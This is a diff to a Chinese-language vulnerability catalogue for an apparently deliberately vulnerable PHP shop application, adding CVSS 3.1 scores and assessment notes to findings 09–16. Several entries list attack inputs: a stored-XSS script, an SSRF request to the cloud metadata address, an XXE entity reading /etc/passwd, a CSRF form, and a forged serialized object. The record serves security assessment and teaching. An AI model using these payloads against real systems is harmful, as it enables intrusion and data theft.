+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 0.0,
+        "environmental_score": 0.0,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "0.0 表示按当前证据没有可量化的直接 CIA 影响，不表示不存在导航滥用或钓鱼风险；不把后续社工成功假定为已发生。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "09",
@@ -307,10 +825,13 @@
       "class": "info_disclosure",
       "scenario": null,
       "cwe": "CWE-209",
-      "severity": "medium",
-      "severity_cn": "中",
+      "severity": "low",
+      "severity_cn": "低",
       "location": [
-        { "path": "app/public/ops/database.php", "line": 3 }
+        {
+          "path": "app/public/ops/database.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "GET /ops/database.php",
@@ -327,12 +848,71 @@
         "sink": "echo get_class($e).': '.$e->getMessage().\"\\n\".$e->getTraceAsString()（app/public/ops/database.php:3）",
         "flow": "probe=archive → PDO 异常 → 回显异常类名/消息/完整堆栈（含 DSN、主机、用户名等）"
       },
-      "evidence": ["app/public/ops/database.php:3"],
-      "preconditions": ["需要 operator/admin 登录", "probe=archive"],
+      "evidence": [
+        "app/public/ops/database.php:3"
+      ],
+      "preconditions": [
+        "运营员或管理员权限；选择诊断用的未配置归档数据源。"
+      ],
       "attack_input": "?probe=archive",
       "normal_input": "?probe=main",
       "expected_result": "正常输入显示连接正常；archive 输入泄露 DSN/主机/账号及完整堆栈信息",
-      "remediation": "对外只返回通用错误信息，异常细节仅写日志"
+      "remediation": "对外只返回通用错误信息，异常细节仅写日志",
+      "description": "数据库诊断捕获真实连接异常后，把异常类型、消息和调用栈完整回显到页面。",
+      "impact": "暴露数据源名称、数据库账号标识和源码路径等内部实现信息；主业务连接仍保持独立。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 2.7,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "L",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 2.7,
+        "environmental_score": 2.7,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "仅本次诊断连接失败，不据此认定整个业务数据库不可用。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "10",
@@ -344,8 +924,14 @@
       "severity": "medium",
       "severity_cn": "中",
       "location": [
-        { "path": "app/public/auth/register.php", "line": 8 },
-        { "path": "app/src/setup.php", "line": 17 }
+        {
+          "path": "app/public/auth/register.php",
+          "line": 8
+        },
+        {
+          "path": "app/src/setup.php",
+          "line": 17
+        }
       ],
       "entry_point": {
         "route": "POST /auth/register.php",
@@ -362,12 +948,73 @@
         "sink": "INSERT INTO users(...password_md5...)（app/public/auth/register.php:8；setup.php:17）",
         "flow": "password → md5() → 明文等价可逆/彩虹表可破解的弱哈希入库"
       },
-      "evidence": ["app/public/auth/register.php:8", "app/src/setup.php:17"],
-      "preconditions": [],
+      "evidence": [
+        "app/public/auth/register.php:8",
+        "app/src/setup.php:17"
+      ],
+      "preconditions": [
+        "经受控只读数据库导出或本地备份取得目标的已存摘要；取得材料的独立漏洞不并入本项。",
+        "受影响目标使用可恢复的低熵口令；不假定任意强随机口令均可恢复。"
+      ],
       "attack_input": "注册任意用户后从数据库导出 md5 值离线破解",
       "normal_input": "正常注册（password≥8位）",
       "expected_result": "密码以可破解的 md5 存储，泄露后可还原明文（弱口令直接命中）",
-      "remediation": "使用 password_hash()（bcrypt/argon2）加盐存储"
+      "remediation": "使用 password_hash()（bcrypt/argon2）加盐存储",
+      "description": "注册及初始化以无独立盐的 MD5 保存密码摘要；登录按相同 MD5 结果比对。",
+      "impact": "当攻击者具有只读摘要材料且目标使用可猜测口令时，离线恢复成本显著降低，可导致口令机密性丧失及对应会员账户被冒用。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.3,
+        "base_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N",
+        "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "L",
+          "AC": "H",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "L",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 5.3,
+        "environmental_score": 5.3,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "不能以数据库管理权限或已读取摘要本身证明 MD5 的额外影响；本条区分取得摘要的前提与离线恢复造成的损害。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "11",
@@ -376,10 +1023,13 @@
       "class": "xss_s",
       "scenario": null,
       "cwe": "CWE-79",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/support/messages.php", "line": 5 }
+        {
+          "path": "app/public/support/messages.php",
+          "line": 5
+        }
       ],
       "entry_point": {
         "route": "POST /support/messages.php",
@@ -396,12 +1046,71 @@
         "sink": "echo 存储内容（app/public/support/messages.php:5）",
         "flow": "message → DB 存储 → 其他用户查看时脚本在浏览器执行（持久化）"
       },
-      "evidence": ["app/public/support/messages.php:5"],
-      "preconditions": ["需要登录", "受害者访问留言列表页"],
+      "evidence": [
+        "app/public/support/messages.php:5"
+      ],
+      "preconditions": [
+        "攻击者以普通会员身份提交留言；另一名用户浏览留言。"
+      ],
       "attack_input": "message=<script>fetch('/account/me.php')</script>",
       "normal_input": "message=包装很好",
       "expected_result": "正常留言仅显示文本；恶意留言对所有查看者执行脚本（存储型 XSS）",
-      "remediation": "输出存储内容前用 htmlspecialchars() 转义，或输入侧做白名单清洗"
+      "remediation": "输出存储内容前用 htmlspecialchars() 转义，或输入侧做白名单清洗",
+      "description": "客服留言使用绑定参数存储内容，但展示时将 message 原样插入 HTML，缺少输出编码。",
+      "impact": "不可信内容随留言持久保存，在其他用户正常浏览留言时进入其商城同源浏览器上下文。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 5.4,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "R",
+          "S": "C",
+          "C": "L",
+          "I": "L",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 5.4,
+        "environmental_score": 5.4,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "不因持久化就自动赋予最高影响，也不串联其他后台漏洞。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "12",
@@ -410,10 +1119,13 @@
       "class": "ssrf",
       "scenario": null,
       "cwe": "CWE-918",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/ops/url-preview.php", "line": 3 }
+        {
+          "path": "app/public/ops/url-preview.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "GET /ops/url-preview.php",
@@ -430,12 +1142,71 @@
         "sink": "file_get_contents()（app/public/ops/url-preview.php:3）",
         "flow": "url → 服务端 HTTP 请求 → 读取并回显任意内网/云元数据地址内容"
       },
-      "evidence": ["app/public/ops/url-preview.php:3"],
-      "preconditions": ["需要 operator/admin 登录"],
+      "evidence": [
+        "app/public/ops/url-preview.php:3"
+      ],
+      "preconditions": [
+        "运营员或管理员权限；目标对容器网络或 Web 进程文件权限可达。"
+      ],
       "attack_input": "?url=http://169.254.169.254/latest/meta-data/",
       "normal_input": "?url=http://fixtures:8080/catalog-info",
       "expected_result": "正常输入预览外部内容；恶意输入读取云元数据/内网服务（SSRF）",
-      "remediation": "对目标做协议/主机白名单、禁止内网地址与 file:// 等协议"
+      "remediation": "对目标做协议/主机白名单、禁止内网地址与 file:// 等协议",
+      "description": "链接预览直接对用户提供的 URL 调用 file_get_contents，既未限制网络目标，也未限制可接受的协议。",
+      "impact": "服务器可读取应用内部服务；同一入口接受的本地文件协议还可触及 Web 进程可读的受限应用资料。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.9,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 4.9,
+        "environmental_score": 4.9,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "预览结果做 HTML 编码；不据此声称浏览器脚本执行、任意写入或命令执行。辅助服务专供商城，未假定外部系统失陷。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "13",
@@ -444,10 +1215,13 @@
       "class": "xxe",
       "scenario": null,
       "cwe": "CWE-611",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/ops/xml-import.php", "line": 3 }
+        {
+          "path": "app/public/ops/xml-import.php",
+          "line": 3
+        }
       ],
       "entry_point": {
         "route": "POST /ops/xml-import.php",
@@ -464,12 +1238,71 @@
         "sink": "simplexml_load_string()（app/public/ops/xml-import.php:3）",
         "flow": "xml → DTD 定义外部实体 → 实体展开读取本地文件/内网资源"
       },
-      "evidence": ["app/public/ops/xml-import.php:3"],
-      "preconditions": ["需要 operator/admin 登录", "POST 且带 CSRF token"],
+      "evidence": [
+        "app/public/ops/xml-import.php:3"
+      ],
+      "preconditions": [
+        "运营员或管理员权限；可提交 XML 配置；实体目标对解析进程可达。"
+      ],
       "attack_input": "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><config><title>&e;</title></config>",
       "normal_input": "<config><title>春日上新</title></config>",
       "expected_result": "正常输入回显标题；恶意输入回显 /etc/passwd 内容（XXE 任意文件读取）",
-      "remediation": "禁用 LIBXML_NOENT/LIBXML_DTDLOAD 并禁用外部实体加载"
+      "remediation": "禁用 LIBXML_NOENT/LIBXML_DTDLOAD 并禁用外部实体加载",
+      "description": "XML 配置导入启用 LIBXML_NOENT 与 LIBXML_DTDLOAD，并读取展开后的 title，没有拒绝外部实体。",
+      "impact": "服务器解析 XML 时可访问外部实体指向的可读资源，敏感应用文件内容可能进入导入结果。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.9,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "H",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 4.9,
+        "environmental_score": 4.9,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "未因 XML 类别就假定无限实体扩展可用；没有给出持续拒绝服务或写入能力的独立依据。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "14",
@@ -478,10 +1311,13 @@
       "class": "csrf",
       "scenario": null,
       "cwe": "CWE-352",
-      "severity": "medium",
-      "severity_cn": "中",
+      "severity": "low",
+      "severity_cn": "低",
       "location": [
-        { "path": "app/public/account/settings.php", "line": 5 }
+        {
+          "path": "app/public/account/settings.php",
+          "line": 5
+        }
       ],
       "entry_point": {
         "route": "POST /account/settings.php",
@@ -498,12 +1334,73 @@
         "sink": "UPDATE users SET email=?（app/public/account/settings.php:5）",
         "flow": "攻击者伪造表单 → 受害者浏览器携带会话提交 → 邮箱被静默篡改"
       },
-      "evidence": ["app/public/account/settings.php:5"],
-      "preconditions": ["受害者已登录", "受害者访问攻击者页面并自动提交表单"],
+      "evidence": [
+        "app/public/account/settings.php:5"
+      ],
+      "preconditions": [
+        "受害者已登录并访问不可信页面。",
+        "会话显式设置 SameSite=Lax；需攻击者可控的同站点跨源页面等能携带 Cookie 的情形，任意跨站 POST 并不满足此条件。"
+      ],
       "attack_input": "<form method=POST action=/account/settings.php><input name=email value=attacker@evil.example></form> 自动提交",
       "normal_input": "用户主动修改邮箱",
       "expected_result": "无 token 校验的状态变更可被跨站触发（CSRF）",
-      "remediation": "为状态变更接口加入并校验 CSRF token（check_csrf）"
+      "remediation": "为状态变更接口加入并校验 CSRF token（check_csrf）",
+      "description": "邮箱设置接受带会话的 POST 并直接修改用户邮箱，没有校验 CSRF 令牌或请求来源。",
+      "impact": "在受害者浏览器携带目标会话的请求条件下，第三方页面可促使其邮箱被非自愿修改。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 3.1,
+        "base_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "H",
+          "PR": "N",
+          "UI": "R",
+          "S": "U",
+          "C": "N",
+          "I": "L",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 3.1,
+        "environmental_score": 3.1,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "默认独立来源端口与同站点、跨站点不是同一概念；此评分明确保留浏览器 Cookie 条件，不串联 XSS 绕过。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide",
+          "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value"
+        ]
+      }
     },
     {
       "id": "15",
@@ -515,7 +1412,10 @@
       "severity": "medium",
       "severity_cn": "中",
       "location": [
-        { "path": "app/public/account/backup.php", "line": 5 }
+        {
+          "path": "app/public/account/backup.php",
+          "line": 5
+        }
       ],
       "entry_point": {
         "route": "POST /account/backup.php",
@@ -532,12 +1432,71 @@
         "sink": "unserialize() 后 UPDATE users SET tier=?,display_name=?（app/public/account/backup.php:5-6）",
         "flow": "backup → unserialize(MemberBackup) → 自造 tier=gold → 越权升级会员"
       },
-      "evidence": ["app/public/account/backup.php:5"],
-      "preconditions": ["需要登录", "伪造 MemberBackup 且 tier 字段为 gold"],
+      "evidence": [
+        "app/public/account/backup.php:5"
+      ],
+      "preconditions": [
+        "普通会员登录并持有本人页面令牌；提交恢复数据。"
+      ],
       "attack_input": "base64_encode(serialize(MemberBackup{tier:gold, displayName:x}))",
       "normal_input": "当前账号的合法备份导出值",
       "expected_result": "合法备份仅恢复原权益；伪造备份把自身 tier 提升为 gold",
-      "remediation": "避免反序列化用户输入，或对对象字段做严格白名单校验"
+      "remediation": "避免反序列化用户输入，或对对象字段做严格白名单校验",
+      "description": "会员备份对用户数据直接 unserialize，随后信任还原对象中的 tier 和 displayName 并写回本人账户。",
+      "impact": "会员可绕过权益授予流程，改变会员等级和显示名称。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 4.3,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "N",
+          "I": "L",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 4.3,
+        "environmental_score": 4.3,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
+          "应用、专用业务数据库、运行目录及专供该应用的辅助服务作为同一安全范围；不推定容器逃逸、宿主入侵或外部系统失陷。浏览器脚本跨越服务端到受害者浏览器的边界时记 S:C。",
+          "仅静态分析，未运行 POC、攻击请求或漏洞验证；利用成熟度、修复状态、外部报告可信度以及部署环境均未独立评估，保留对应指标 X。"
+        ],
+        "notes": [
+          "本入口仅加载 MemberBackup；没有将任务场景的 DispatchJob 类链自动套用到此文件，不直接按代码执行评分。"
+        ],
+        "references": [
+          "https://www.first.org/cvss/v3.1/specification-document",
+          "https://www.first.org/cvss/v3.1/user-guide"
+        ]
+      }
     },
     {
       "id": "16",
@@ -546,10 +1505,13 @@
       "class": "idor",
       "scenario": null,
       "cwe": "CWE-639",
-      "severity": "high",
-      "severity_cn": "高",
+      "severity": "medium",
+      "severity_cn": "中",
       "location": [
-        { "path": "app/public/orders/detail.php", "line": 2 }
+        {
+          "path": "app/public/orders/detail.php",
+          "line": 2
+        }
       ],
       "entry_point": {
         "route": "GET /orders/detail.php",
@@ -566,12 +1528,71 @@
         "sink": "db()->prepare(...WHERE o.id=?)->execute([$_GET['id']])（app/public/orders/detail.php:2）",
         "flow": "id → 直接查任意订单 → 泄露他人订单号/商品/备注/金额"
       },
-      "evidence": ["app/public/orders/detail.php:2"],
-      "preconditions": ["需要登录", "枚举他人订单 id"],
+      "evidence": [
+        "app/public/orders/detail.php:2"
+      ],
+      "preconditions": [
+        "普通会员登录；其他会员订单存在。"
+      ],
       "attack_input": "?id=1（他人订单）",
       "normal_input": "?id=自己的订单",
       "expected_result": "可读取任意订单详情，包括他人 private_note（IDOR）",
-      "remediation": "查询增加 o.user_id = 当前登录用户 条件"
+      "remediation": "查询增加 o.user_id = 当前登录用户 条件",
+      "description": "订单详情只校验已登录，然后按订单 ID 查询，未把当前用户 ID 纳入所有权条件。",
+      "impact": "普通会员可跨账户读取私有订单、购买信息和配送备注等业务隐私。",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 6.5,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "N",
+          "A": "N",
+          "E": "X",
+          "RL": "X",
+          "RC": "X",
+          "CR": "X",
+          "IR": "X",
+          "AR": "X",
+          "MAV": "X",
+          "MAC": "X",
+          "MPR": "X",
+          "MUI": "X",
+          "MS": "X",
+          "MC": "X",
+          "MI": "X",
+          "MA": "X"
+        },
+        "temporal_score": 6.5,
+        "environmental_score": 6.5,
+        "temporal_assessed": false,
+        "environmental_assessed": false
+      },
+      "assessment": {
+        "method": "static_source_review",
+        "date": "2026-10-22",
+        "source_archive_sha256": "67fd87e9ae771d10eaa0797ef2c2af2e0fe381036cd8efe4f92b3d26eec3d36c",
+        "assumptions": [
+          "按独立漏洞和源码所声明的角色校验评分，不将其他编号漏洞串联，也不利用公开教学账号口令绕过角色前提；普通会员记 PR:L，后台运营/管理员记 PR:H。",
+          "HTTP 入口的基础 AV 按 N 评分；默认仅绑定 127.0.0.1 是部署限制，不将网络漏洞改记为本地漏洞。",
